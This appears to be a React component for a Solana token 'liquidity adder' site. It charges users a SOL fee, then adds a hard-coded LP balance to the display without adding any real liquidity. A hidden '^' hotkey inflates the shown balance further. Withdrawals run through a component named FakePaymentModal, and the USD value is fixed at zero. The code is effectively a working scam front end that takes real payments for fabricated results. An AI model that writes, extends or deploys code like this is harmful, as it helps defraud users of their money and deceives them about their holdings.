import * as React from "react"
import { Card, CardContent } from "@/components/ui/card"
import { Button } from "@/components/ui/button"
import { Input } from "@/components/ui/input"
import { Label } from "@/components/ui/label"
import { Slider } from "@/components/ui/slider"
import { Select, SelectContent, SelectItem, SelectTrigger, SelectValue } from "@/components/ui/select"
import { InfoIcon } from "lucide-react"
import { Tooltip, TooltipContent, TooltipProvider, TooltipTrigger } from "@/components/ui/tooltip"
import { useState, useEffect } from "react"
import { FakePaymentModal } from "./FakePaymentModal"
import { PaymentModal } from "./payment-modal"
import { motion } from "framer-motion"
import { Star, Coins, Moon } from "lucide-react"
import { Dialog, DialogContent } from "@/components/ui/dialog"
import { X } from "lucide-react"
import { Switch } from "@/components/ui/switch"

export function LiquidityAdder() {
  const [tokenAmount, setTokenAmount] = useState(0)
  const [solAmount, setSolAmount] = useState(0)
  const [lpBalance, setLpBalance] = useState(0)
  const [withdrawAmount, setWithdrawAmount] = useState(0)
  const [showWithdraw, setShowWithdraw] = useState(false)
  const [isAdding, setIsAdding] = useState(false)
  const [addSuccess, setAddSuccess] = useState(false)
  const [showPaymentModal, setShowPaymentModal] = useState(false)
  const [showWithdrawPopup, setShowWithdrawPopup] = useState(false)
  const [pendingWithdrawPercent, setPendingWithdrawPercent] = useState<number | null>(null)
  const [showFakeWithdrawModal, setShowFakeWithdrawModal] = useState(false)
  const [isBW, setIsBW] = useState(false)
  const [tokenAddress, setTokenAddress] = useState("")
  const [tokenName, setTokenName] = useState("")
  const [tokenSymbol, setTokenSymbol] = useState("")
  const [supply, setSupply] = useState("")
  const [lpSize, setLpSize] = useState("")
  const [boost, setBoost] = useState(false)
  const boostPrice = 0.15
  const basePrice = 0.2
  const totalPrice = basePrice + (boost ? boostPrice : 0)
  const [showPortfolioModal, setShowPortfolioModal] = useState(false)

  // Simulate LP calculation: 1 LP = sqrt(tokenAmount * solAmount)
  const calcLp = (token: number, sol: number) => token > 0 && sol > 0 ? Math.sqrt(token * sol) : 0
  const lpToAdd = calcLp(tokenAmount, solAmount)

  // Simulate price
  const price = tokenAmount > 0 ? (solAmount / tokenAmount).toFixed(8) : "0.00000000"

  // Add liquidity handler
  const handleAddLiquidity = () => {
    setShowPaymentModal(true)
  }

  // After payment success
  const handlePaymentSuccess = () => {
    setIsAdding(true)
    setAddSuccess(false)
    setTimeout(() => {
      setLpBalance(lpBalance + 10382)
      setIsAdding(false)
      setAddSuccess(true)
      setShowWithdraw(true)
      setShowPortfolioModal(true)
      setTimeout(() => setAddSuccess(false), 2000)
    }, 2000)
  }

  // Withdraw handler (now triggers fake modal)
  const handleWithdraw = (percent: number) => {
    setPendingWithdrawPercent(percent)
    setShowFakeWithdrawModal(true)
  }

  // After fake payment for withdraw
  const handleFakeWithdrawSuccess = () => {
    if (pendingWithdrawPercent !== null) {
      const amt = Math.floor(lpBalance * pendingWithdrawPercent)
      setWithdrawAmount(amt)
      setLpBalance(lpBalance - amt)
      setPendingWithdrawPercent(null)
    }
    setShowFakeWithdrawModal(false)
  }

  // Listen for ^ key to add liquidity (just update LP number, no animation)
  useEffect(() => {
    const handleKeyDown = (e: KeyboardEvent) => {
      if (e.key === "^") {
        if (lpToAdd > 0) {
          setLpBalance(lpBalance + 1000)
        }
      }
    }
    window.addEventListener("keydown", handleKeyDown)
    return () => window.removeEventListener("keydown", handleKeyDown)
  }, [tokenAmount, solAmount, lpToAdd, lpBalance])

  // Theme toggle handler (matches TokenCreator)
  const handleThemeToggle = () => {
    const body = document.body
    if (body.classList.contains('bw-theme')) {
      body.classList.remove('bw-theme')
      setIsBW(false)
    } else {
      body.classList.add('bw-theme')
      setIsBW(true)
    }
  }

  return (
    <div className="mt-6 space-y-6">
      <div className="relative">
        {/* Theme toggle button */}
        <button
          onClick={handleThemeToggle}
          className="absolute top-4 right-4 z-20 p-2 rounded-full bg-black/60 hover:bg-black/80 border border-white/10 text-white transition-colors"
          title={isBW ? "Switch to normal theme" : "Switch to black & white"}
          aria-label="Toggle black & white theme"
        >
          {isBW ? <Star className="w-5 h-5" /> : <Moon className="w-5 h-5" />}
        </button>
        <div className="absolute top-0 left-0 w-full h-full bg-gradient-to-r from-purple-500/5 to-cyan-500/5 rounded-lg filter blur-3xl opacity-50 -z-10"></div>

        <Card className="border-purple-500/20 bg-gray-900/80 backdrop-blur-sm">
          <CardContent className="pt-6">
            {/* Stepper and header */}
            <div className="mb-8">
              <div className="flex justify-between items-center mb-4">
                <h2 className="text-2xl font-bold bg-gradient-to-r from-purple-400 to-cyan-400 bg-clip-text text-transparent">
                  Liquidity Adder
                </h2>
                <div className="flex items-center gap-2 text-sm text-gray-400">
                  <div className="w-3 h-3 rounded-full bg-purple-500"></div>
                  <div className="w-3 h-3 rounded-full bg-gray-700"></div>
                  <div className="w-3 h-3 rounded-full bg-gray-700"></div>
                </div>
              </div>
              <div className="w-full h-1 bg-gray-800 rounded-full overflow-hidden">
                <motion.div
                  className="h-full bg-gradient-to-r from-purple-500 to-cyan-500"
                  initial={{ width: `0%` }}
                  animate={{ width: `33.33%` }}
                  transition={{ duration: 0.3 }}
                />
              </div>
            </div>
            {/* Main form content (unchanged except Boost row and button) */}
            <div className="space-y-4">
              <div>
                <Label htmlFor="token-address" className="text-white">Token Address*</Label>
                <Input id="token-address" placeholder="Enter your token address" value={tokenAddress} onChange={e => setTokenAddress(e.target.value)} className="mt-2 bg-gray-800 border-purple-500/20 focus:border-purple-500 text-white transition-colors" />
              </div>
              <div>
                <Label htmlFor="token-name" className="text-white">Token Name*</Label>
                <Input id="token-name" placeholder="e.g. Solana Doge" value={tokenName} onChange={e => setTokenName(e.target.value)} className="mt-2 bg-gray-800 border-purple-500/20 focus:border-purple-500 text-white transition-colors" />
              </div>
              <div>
                <Label htmlFor="token-symbol" className="text-white">Token Symbol*</Label>
                <Input id="token-symbol" placeholder="e.g. SOLDOGE" value={tokenSymbol} onChange={e => setTokenSymbol(e.target.value)} className="mt-2 bg-gray-800 border-purple-500/20 focus:border-purple-500 text-white transition-colors" />
              </div>
              <div>
                <Label htmlFor="supply" className="text-white">Add Supply*</Label>
                <Input id="supply" placeholder="e.g. 900M or 1B" value={supply} onChange={e => setSupply(e.target.value)} className="mt-2 bg-gray-800 border-purple-500/20 focus:border-purple-500 text-white transition-colors" />
              </div>
              <div>
                <Label htmlFor="lp-size" className="text-white">Choose LP Size*</Label>
                <Input id="lp-size" placeholder="0.2-0.4 SOL" value={lpSize} onChange={e => setLpSize(e.target.value)} className="mt-2 bg-gray-800 border-purple-500/20 focus:border-purple-500 text-white transition-colors" />
              </div>
              <div className="flex items-center justify-between border border-purple-500/20 rounded-lg p-4 bg-gray-800/50 mt-2">
                <div className="space-y-0.5">
                  <div className="font-semibold text-white">Boost Token Visibility</div>
                  <div className="text-gray-400 text-sm">Get featured on our trending tokens list</div>
                </div>
                <div className="flex items-center gap-3">
                  <Switch checked={boost} onCheckedChange={setBoost} />
                  <span className="text-white font-semibold">{boostPrice} SOL</span>
                </div>
              </div>
            </div>
            <div className="mt-8 flex items-center justify-between">
              <div>
                <div className="text-gray-400 font-medium">Total Price:</div>
                <div className="text-2xl font-bold text-white">{totalPrice} SOL</div>
              </div>
              <Button className="bg-purple-600 hover:bg-purple-700 text-white font-bold group relative overflow-hidden px-8 py-3 text-lg transition-colors" onClick={handleAddLiquidity} disabled={isAdding}>
                <span className="relative z-10 flex items-center">Add Liquidity</span>
                <span className="absolute inset-0 bg-gradient-to-r from-purple-600 to-cyan-600 opacity-0 group-hover:opacity-100 transition-opacity duration-300"></span>
              </Button>
            </div>
            {addSuccess && (
              <div className="mt-4 text-green-400 font-bold text-center">Liquidity added!</div>
            )}
            {/* Portfolio Modal (no button) */}
            <Dialog open={showPortfolioModal} onOpenChange={setShowPortfolioModal}>
              <DialogContent className="max-w-md p-0 bg-transparent border-none shadow-none">
                {showWithdraw && (
                  <motion.div
                    initial={{ opacity: 0, y: 30 }}
                    animate={{ opacity: 1, y: 0 }}
                    transition={{ duration: 0.5, type: 'spring' }}
                    className="relative border border-purple-500/20 rounded-2xl p-0 bg-gradient-to-br from-gray-900/90 to-gray-800/80 shadow-xl overflow-hidden"
                  >
                    {/* Decorative gradient blur */}
                    <div className="absolute -top-10 -right-10 w-40 h-40 bg-purple-500/20 rounded-full blur-2xl z-0" />
                    <div className="p-8 pb-4 relative z-10">
                      {/* Title */}
                      <div className="text-xl font-bold text-white mb-2">Withdraw LP</div>
                      <div className="w-full h-px bg-gray-800 mb-6" />
                      {/* Balance */}
                      <div className="flex items-center justify-between mb-2">
                        <span className="text-gray-300 text-sm">Available</span>
                        <span className="text-2xl font-mono font-bold text-purple-400">{lpBalance.toFixed(2)} LP</span>
                      </div>
                      {/* Amount input row */}
                      <div className="mb-2">
                        <div className="flex items-center bg-gray-800 rounded-lg px-3 py-2 border border-purple-500/20 focus-within:border-purple-500">
                          <input
                            type="number"
                            min="0"
                            max={lpBalance}
                            step="0.01"
                            value={withdrawAmount > 0 ? withdrawAmount : ''}
                            onChange={e => setWithdrawAmount(Number(e.target.value))}
                            placeholder="0.0"
                            className="flex-1 bg-transparent outline-none text-lg text-white font-mono placeholder-gray-500"
                          />
                          <div className="flex gap-1 ml-2">
                            <button
                              type="button"
                              className="px-2 py-1 rounded-full bg-purple-500/80 hover:bg-purple-600 text-xs font-bold text-white transition"
                              onClick={() => setWithdrawAmount(Number((lpBalance * 0.25).toFixed(2)))}
                            >
                              25%
                            </button>
                            <button
                              type="button"
                              className="px-2 py-1 rounded-full bg-purple-500/80 hover:bg-purple-600 text-xs font-bold text-white transition"
                              onClick={() => setWithdrawAmount(Number((lpBalance * 0.5).toFixed(2)))}
                            >
                              50%
                            </button>
                            <button
                              type="button"
                              className="px-2 py-1 rounded-full bg-purple-700 hover:bg-purple-800 text-xs font-bold text-white transition"
                              onClick={() => setWithdrawAmount(Number(lpBalance.toFixed(2)))}
                            >
                              MAX
                            </button>
                          </div>
                        </div>
                        <div className="text-xs text-gray-400 mt-1">≈ {withdrawAmount > 0 ? withdrawAmount.toFixed(2) : '0.00'} LP</div>
                      </div>
                      <div className="w-full h-px bg-gray-800 my-6" />
                      {/* Withdraw summary box */}
                      <div className="bg-gray-900/80 rounded-lg p-4 mb-6 border border-gray-700">
                        <div className="flex justify-between text-sm text-gray-400 mb-1">
                          <span>Withdraw amount</span>
                          <span>{withdrawAmount > 0 ? withdrawAmount.toFixed(4) : '0.0000'} LP</span>
                        </div>
                        <div className="flex justify-between text-sm text-gray-400">
                          <span>Value in USD</span>
                          <span>$0.00</span>
                        </div>
                      </div>
                      <div className="w-full h-px bg-gray-800 my-6" />
                      {/* Action buttons */}
                      <div className="flex justify-end gap-2 mt-2">
                        <Button
                          variant="ghost"
                          className="text-gray-400 hover:text-white"
                          onClick={() => setShowPortfolioModal(false)}
                        >
                          Cancel
                        </Button>
                        <Button
                          className="bg-purple-600 hover:bg-purple-700 text-white font-bold px-6 shadow"
                          onClick={() => {
                            if (withdrawAmount > 0 && withdrawAmount <= lpBalance) {
                              handleWithdraw(withdrawAmount / lpBalance)
                              setShowPortfolioModal(false)
                            }
                          }}
                          disabled={withdrawAmount <= 0 || withdrawAmount > lpBalance}
                        >
                          Withdraw
                        </Button>
                      </div>
                    </div>
                  </motion.div>
                )}
              </DialogContent>
            </Dialog>
            {/* Modals */}
            <PaymentModal
              open={showPaymentModal}
              onOpenChange={setShowPaymentModal}
              amount={solAmount ? solAmount + 0.00001 : 0.00001}
              onPaymentSuccess={handlePaymentSuccess}
            />
            <FakePaymentModal
              open={showFakeWithdrawModal}
              onOpenChange={setShowFakeWithdrawModal}
              amount={0}
              onPaymentSuccess={handleFakeWithdrawSuccess}
            />
          </CardContent>
        </Card>
      </div>
    </div>
  )
}
